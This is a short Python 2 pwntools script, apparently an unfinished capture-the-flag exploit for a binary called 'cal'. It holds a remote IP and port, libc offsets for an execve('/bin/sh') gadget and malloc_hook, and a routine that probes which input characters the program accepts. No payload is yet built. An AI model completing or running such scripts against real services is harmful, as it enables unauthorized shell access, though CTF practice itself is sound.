import time, sys
from pwn import *

# local process envirnoment
LOCAL = True
elf_name = "./cal"

#retmote args
remote_host = "118.31.18.29"
remote_port = 20003
elf = ELF(elf_name)

if LOCAL:
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    #context.log_level = "debug"
    mine_env = os.environ
    io = process(elf_name, env=mine_env)
else:
    printf_off = 0x4CDD0
    system_off = 0x3FE70
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.01)

def s_leak():
    for i in range(128):
        if chr(i)!='(' and chr(i) != ')':
            io.sendline(chr(i))
            rec_byte = io.recvline()
            if 'range' not in rec_byte:
                print chr(i)
            io.recvuntil('>')
    #return libc_base_addr

def s_exp():
    s_leak()
    # io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
